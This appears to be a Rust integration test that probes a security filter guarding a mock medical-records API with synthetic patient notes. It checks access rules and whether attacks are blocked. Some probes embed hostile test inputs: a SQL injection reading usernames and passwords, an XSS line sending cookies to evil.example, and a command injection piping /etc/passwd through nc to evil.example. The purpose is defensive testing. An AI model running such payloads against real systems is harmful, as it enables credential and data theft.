
// ---- local probe of the `part` sentences (not committed) ----

fn filler(chars: usize, offset: usize) -> String {
    const SENTENCES: [&str; 8] = [
        "Patient reports mild headache in the morning that eases after breakfast. ",
        "Blood pressure measured twice today and both readings were within the normal range. ",
        "No fever, no cough, appetite is good and sleep has improved since the last visit. ",
        "Advised to continue the current dose and to drink more water during the day. ",
        "Follow-up appointment suggested in two weeks, earlier if the dizziness returns. ",
        "Family history discussed again, nothing new to add to the existing record. ",
        "Walks thirty minutes every evening and has reduced salt as recommended. ",
        "Asked about travel next month, no objection as long as medication is carried. ",
    ];
    let mut text = String::new();
    let mut index = offset;
    while text.chars().count() < chars {
        text.push_str(SENTENCES[index % SENTENCES.len()]);
        index += 1;
    }
    text.chars().take(chars).collect()
}

fn filler_zh(chars: usize) -> String {
    const SENTENCES: [&str; 4] = [
        "患者今晨自述轻微头痛，早餐后缓解，血压两次测量均在正常范围。",
        "无发热，无咳嗽，食欲良好，睡眠较上次就诊有所改善。",
        "建议继续目前剂量，白天多饮水，两周后复诊，如再次头晕请提前就诊。",
        "每天傍晚步行三十分钟，已按建议减少食盐摄入。",
    ];
    let mut text = String::new();
    let mut index = 0;
    while text.chars().count() < chars {
        text.push_str(SENTENCES[index % SENTENCES.len()]);
        index += 1;
    }
    text.chars().take(chars).collect()
}

fn many_fields(extra: &str) -> String {
    let mut fields: Vec<String> = (0..24)
        .map(|index| format!(r#""answer_{index}":"{}""#, filler(420, index)))
        .collect();
    fields.push(format!(r#""summary":"{}""#, filler(1500, 3)));
    if !extra.is_empty() {
        fields.push(extra.to_owned());
    }
    format!("{{{}}}", fields.join(","))
}

struct Probe {
    name: &'static str,
    site: usize,
    method: &'static str,
    path: &'static str,
    query: Option<String>,
    body: String,
    expect_block: bool,
}

#[tokio::test]
#[ignore = "needs XSHIELD_JEV_API_KEY and network access"]
async fn live_parts_probe() {
    let emr = r#""/login","/api/home","/api/patients""#;
    let functions = format!(
        r#"{{"ask_unknown_functions":true,"functions":[{EMR_FUNCTIONS},{{"key":"POST /api/patients/{{id}}/notes","source":"rule"}},{ADMIN_FUNCTIONS}]}}"#
    );
    let sites = [site_spec("emr-probe", emr, &functions)];
    let judge = Judge::new(
        ContextKey::new(vec![8; 32]),
        JevClient::from_environment().expect("Jev configuration"),
    );
    for site in &sites {
        see(&judge, site, DOCTOR, "GET", "/api/home", br#"{"doctor":{"id":"DR-A"}}"#, 1_000);
        see(
            &judge,
            site,
            DOCTOR,
            "GET",
            "/api/patients",
            br#"{"patients":[{"id":"7005","name":"Zhang Wei","age":54},{"id":"7008","name":"Li Na","age":31},{"id":"7012","name":"Wang Fang","age":47}]}"#,
            1_001,
        );
        see(
            &judge,
            site,
            DOCTOR,
            "GET",
            "/api/patients/7005",
            br#"{"patient":{"id":"7005","name":"Zhang Wei","age":54}}"#,
            1_002,
        );
        see(
            &judge,
            site,
            DOCTOR,
            "GET",
            "/api/patients/7005/notes",
            br#"{"notes":[{"id":"n-100","text":"blood pressure stable"}]}"#,
            1_003,
        );
    }
    let note = |text: &str| format!(r#"{{"text":"{text}"}}"#);
    let sqli = {
        let mut text = filler(490, 0);
        text.push_str(" ' UNION SELECT username, password FROM users-- ");
        text.push_str(&filler(900, 4));
        text
    };
    let xss = {
        let mut text = filler(1400, 1);
        text.push_str("<script>fetch('//evil.example/c?'+document.cookie)</script>");
        text
    };
    let long_id: String = "PT-".chars().chain("4815162342".chars().cycle().take(600)).collect();
    let probes = vec![
        Probe { name: "P1 known fn, verified id, long note", site: 0, method: "POST", path: "/api/patients/7005/notes", query: None, body: note(&filler(1500, 0)), expect_block: false },
        Probe { name: "P2 known fn, unseen id 7006, long note", site: 0, method: "POST", path: "/api/patients/7006/notes", query: None, body: note(&filler(1500, 0)), expect_block: true },
        Probe { name: "P3 unknown ordinary fn, long message", site: 0, method: "POST", path: "/api/feedback", query: None, body: format!(r#"{{"message":"{}"}}"#, filler(1500, 2)), expect_block: false },
        Probe { name: "P4 unknown admin fn, long message", site: 0, method: "POST", path: "/api/admin/broadcast", query: None, body: format!(r#"{{"message":"{}"}}"#, filler(1500, 2)), expect_block: true },
        Probe { name: "P5 admin attempt, long reason", site: 0, method: "POST", path: "/api/admin/export", query: None, body: format!(r#"{{"reason":"{}"}}"#, filler(1500, 5)), expect_block: true },
        Probe { name: "P6 long id-like query value", site: 0, method: "GET", path: "/api/patients/7005/notes", query: Some(format!("note_id={long_id}")), body: String::new(), expect_block: true },
        Probe { name: "P7 SQLi across the first piece edge", site: 0, method: "POST", path: "/api/patients/7005/notes", query: None, body: note(&sqli), expect_block: true },
        Probe { name: "P8 XSS at the end of the last piece", site: 0, method: "POST", path: "/api/patients/7005/notes", query: None, body: note(&xss), expect_block: true },
        Probe { name: "P9 long Chinese note, verified id", site: 0, method: "POST", path: "/api/patients/7005/notes", query: None, body: note(&filler_zh(800)), expect_block: false },
        Probe { name: "P10 many fields, benign", site: 0, method: "POST", path: "/api/patients/7005/notes", query: None, body: many_fields(""), expect_block: false },
        Probe { name: "P11 many fields + unseen attachment_id", site: 0, method: "POST", path: "/api/patients/7005/notes", query: None, body: many_fields(r#""attachment_id":"att-4471""#), expect_block: true },
        Probe { name: "P12 many fields on admin attempt", site: 0, method: "POST", path: "/api/admin/export", query: None, body: many_fields(""), expect_block: true },
        Probe { name: "P13 many fields on unknown ordinary fn", site: 0, method: "POST", path: "/api/feedback", query: None, body: many_fields(""), expect_block: false },
        Probe { name: "P14 many fields + command injection late", site: 0, method: "POST", path: "/api/patients/7005/notes", query: None, body: many_fields(r#""zz_last":"ok; cat /etc/passwd | nc evil.example 4444""#), expect_block: true },
        Probe { name: "P15 long id-like body field", site: 0, method: "POST", path: "/api/patients/7005/notes", query: None, body: format!(r#"{{"text":"routine follow-up","patient_id":"{long_id}"}}"#), expect_block: true },
    ];
    let mut wrong = Vec::new();
    for (index, probe) in probes.iter().enumerate() {
        let now_ms = 10_000 + u64::try_from(index).unwrap_or(0) * 5_000;
        let request_id = format!("req_{now_ms:032x}");
        let judgement = judge
            .judge(
                &sites[probe.site],
                &RequestFacts {
                    route: None,
                    request_headers: &[],
                    method_overrides: &[],
                    request_id: &request_id,
                    method: probe.method,
                    path: probe.path,
                    query: probe.query.as_deref(),
                    content_type: (!probe.body.is_empty()).then_some("application/json"),
                    body: probe.body.as_bytes(),
                    credential: Some(DOCTOR),
                    client: "10.0.0.1",
                    now_ms,
                },
            )
            .await;
        let record = &judgement.record;
        let blocked = !judgement.forward;
        let detail = record.jev.as_ref().map_or_else(
            || "no model call".to_owned(),
            |jev| {
                format!(
                    "batches={:?} batch={:?} left_out={:?} trim={:?} bytes={:?} {}ms access[{}] attack[{}]",
                    jev.batches,
                    jev.batch,
                    jev.left_out,
                    jev.trim,
                    jev.request_bytes,
                    jev.millis,
                    probabilities(&jev.access, ACCESS),
                    probabilities(&jev.attack, ATTACK)
                )
            },
        );
        println!(
            "PROBE {:<42} blocked={:<5} expected={:<5} {:?}/{:?} fn={:?} status={} {}",
            probe.name,
            blocked,
            probe.expect_block,
            record.decision_path,
            record.outcome,
            record.trace.function.as_ref().map(|function| (function.known, function.attempt)),
            judgement.refuse_status,
            detail
        );
        if blocked != probe.expect_block {
            wrong.push(probe.name);
        }
    }
    println!("PROBE wrong: {wrong:?}");
}
